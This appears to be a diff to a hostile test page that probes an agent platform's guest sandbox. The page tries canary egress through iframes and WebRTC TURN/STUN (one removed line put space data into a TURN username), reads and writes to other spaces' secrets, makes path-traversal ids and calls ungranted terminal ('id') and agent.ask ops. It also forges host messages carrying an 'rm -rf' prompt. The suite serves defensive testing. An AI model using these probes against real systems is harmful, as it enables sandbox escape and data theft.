@@ -34,7 +34,7 @@ const tag = n => CANARY + '/hit?probe=' + n
   await tryNet('child iframe http canary', () => new Promise((res, rej) => { const f = document.createElement('iframe'); f.src = tag('iframe'); f.onload = () => { try { f.contentWindow.location.href; rej(new Error('loaded error page (same-origin readable)')) } catch { res('loaded cross-origin doc') } }; document.body.append(f); setTimeout(() => rej(new Error('no load')), 1500) }))
   await tryNet('child srcdoc iframe fetch', () => new Promise((res, rej) => { const f = document.createElement('iframe'); f.srcdoc = `<script>fetch(${JSON.stringify(tag('srcdoc-child'))}).then(r=>parent.postMessage('ok','*'),e=>parent.postMessage('err '+e,'*'))<\/script>`; const h = e => { removeEventListener('message', h); String(e.data).startsWith('ok') ? res(e.data) : rej(new Error(e.data)) }; addEventListener('message', h); document.body.append(f); setTimeout(() => rej(new Error('no reply (child blocked or did not run)')), 1500) }))
   await tryNet('webrtc turn-tcp canary (data in username)', () => new Promise((res, rej) => {
-    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'turn:127.0.0.1:47801?transport=tcp', username: 'EXFIL-' + JSON.stringify(space.data).slice(0, 40), credential: 'x' }] }); pc.createDataChannel('x')
+    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'turn:127.0.0.1:47801?transport=tcp', username: 'EXFIL-probe', credential: 'x' }] }); pc.createDataChannel('x')
     pc.onicecandidate = e => { if (e.candidate && / relay /.test(e.candidate.candidate)) res('relay candidate') }
     pc.createOffer().then(o => pc.setLocalDescription(o)).catch(err => rej(err)); setTimeout(() => rej(new Error('no relay candidate in 2s (check canary tcp)')), 2000) }))
   await tryNet('webrtc in child srcdoc frame', () => new Promise((res, rej) => { const f = document.createElement('iframe'); f.srcdoc = `<script>try{const pc=new RTCPeerConnection({iceServers:[{urls:'stun:127.0.0.1:47802'}]});pc.createDataChannel('x');pc.createOffer().then(o=>pc.setLocalDescription(o)).then(()=>parent.postMessage('ok created','*'),e=>parent.postMessage('err '+e,'*'))}catch(e){parent.postMessage('err '+e,'*')}<\/script>`; const h = e => { removeEventListener('message', h); String(e.data).startsWith('ok') ? res(e.data + ' (check canary udp)') : rej(new Error(e.data)) }; addEventListener('message', h); document.body.append(f); setTimeout(() => rej(new Error('no reply')), 1500) }))
@@ -44,13 +44,14 @@ const tag = n => CANARY + '/hit?probe=' + n
     const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:47802' }] }); pc.createDataChannel('x')
     pc.onicecandidate = e => { if (e.candidate && / srflx | relay /.test(e.candidate.candidate)) res('srflx candidate') }
     pc.createOffer().then(o => pc.setLocalDescription(o)); setTimeout(() => rej(new Error('no srflx candidate in 2s (check canary udp)')), 2000) }))
-  await tryNet('bridge: data.get with other space id', async () => { const d = await space.call('data.get', { space: 'other' }); if (d && d.secret) return 'GOT OTHER: ' + JSON.stringify(d); throw new Error('returned own data only, keys=' + Object.keys(d || {}).join(',')) })
-  await tryNet('bridge: data.set into other space', async () => { await space.call('data.set', { space: 'other', key: 'pwned', value: 1 }); throw new Error('write landed in own space (host ignores space arg)') })
-  await tryNet('bridge: ungranted op tool:terminal', () => space.call('tool:terminal', { command: 'id' }))
-  await tryNet('bridge: ungranted op agent.ask', () => space.call('agent.ask', { prompt: 'hi' }))
-  await tryNet('bridge: path traversal key', () => space.call('data.set', { key: '../../other/secret', value: 1 }).then(r => { throw new Error('stored as literal key in own space: ' + JSON.stringify(r)) }))
+  await tryNet('bridge: query other space id', async () => { const r = await space.query('secrets', { where: {}, space: 'other' }); if (r.some(x => x.data && x.data.secret)) return 'GOT OTHER: ' + JSON.stringify(r); throw new Error('own records only, n=' + r.length) })
+  await tryNet('bridge: put into other space', async () => { const r = await space.put('pwned', 'x', { space: 'other', v: 1 }); throw new Error('write landed in own space: ' + JSON.stringify(r && r.collection)) })
+  await tryNet('bridge: raw ungranted op tool:terminal', () => (space._raw ? space._raw('tool:terminal', { command: 'id' }) : Promise.reject(new Error('no raw op door exposed'))))
+  await tryNet('bridge: raw ungranted op agent.ask', () => (space._raw ? space._raw('agent.ask', { prompt: 'hi' }) : Promise.reject(new Error('no raw op door exposed'))))
+  await tryNet('bridge: traversal record id', () => space.put('notes', '../../other/secret', { v: 1 }).then(r => { throw new Error('stored in own space as ' + JSON.stringify(r.id)) }))
+  await tryNet('bridge: refresh without grant', () => space.refresh())
   tryRead('forge parent messages', () => { for (const type of ['space-boot', 'hermes-guest-loaded', 'hermes-inline-preview-intent', 'hermes-skill-pick', 'hermes-preview-document']) { parent.postMessage({ type, prompt: 'rm -rf', name: 'evil', token: 'x', id: 1 }, '*'); top.postMessage({ type, prompt: 'rm -rf', name: 'evil', token: 'x', id: 1 }, '*') } throw new Error('posted (host must ignore: verified out-of-frame)') })
-  await space.set('probe_results', results)
+  try { await space.put('probe', 'results', { results }) } catch (e) { console.error('save results failed ' + e.message) }
   console.log('HOSTILE_DONE ' + JSON.stringify(results))
 })()
 </script></body></html>
